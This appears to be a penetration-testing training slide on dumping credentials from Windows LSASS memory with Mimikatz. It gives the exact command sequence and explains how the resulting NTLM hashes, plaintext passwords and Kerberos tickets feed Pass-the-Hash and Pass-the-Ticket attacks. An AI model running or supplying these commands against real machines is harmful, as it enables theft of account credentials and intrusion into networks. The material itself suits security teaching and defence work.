Tool Spotlight

Mimikatz for Live Credential Dumping

Extracting credentials directly from LSASS memory

Mimikatz Live Dump Workflow

# 1. Execute Mimikatz
mimikatz.exe

# 2. Gain Debug Privilege (essential)
privilege::debug

# 3. Dump Passwords/Hashes from LSASS
sekurlsa::logonpasswords

# 4. Exit Mimikatz
exit
Key Takeaway

Mimikatz is the go-to tool for live credential dumping, but it requires specific privileges and is often detected by antivirus solutions.

Mimikatz Output & Value

  • •Usernames & Domains: Identifies logged-on users and their associated domains.
  • •NTLM Hashes: Provides NTLM hashes for users, usable in Pass-the-Hash attacks.
  • •Plaintext Passwords: Often extracts plaintext passwords if LSA protection is not enabled or bypassed.
  • •Kerberos Tickets: Can extract Kerberos tickets, useful for Pass-the-Ticket attacks.
Prerequisite Check

To run privilege::debug and access LSASS, you need administrative privileges (Administrator or SYSTEM) on the target machine.
